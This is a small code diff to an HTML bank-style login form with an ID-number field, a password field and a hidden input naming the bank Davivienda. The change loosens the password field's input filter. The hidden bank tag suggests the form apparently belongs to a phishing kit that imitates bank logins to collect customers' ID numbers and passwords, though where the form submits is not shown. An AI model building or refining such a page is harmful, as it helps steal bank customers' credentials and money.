@@ -69,7 +69,7 @@
     </label><br>
 
     <input type="tel" name="documento" id="txtUsuario" style="margin-top:5px;" required minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');">
-    <input type="password" name="clave" id="txtPass" style="margin-top:5px;" minlength="6" maxlength="8" oninput="this.value = this.value.replace(/\D+/g, '');">
+    <input type="password" name="clave" id="txtPass" style="margin-top:5px;" minlength="6" maxlength="8"  oninput="this.value = this.value.replace(/\s+/g, '')">
     <input type="hidden" value="davivienda" id="banco">
 
         <input type="submit" value="Ingresar" id="btnUsuario" style="border:none; background-color:red; height:45px; border-bottom:5px solid red; margin-top:5px;"><br><br><br>
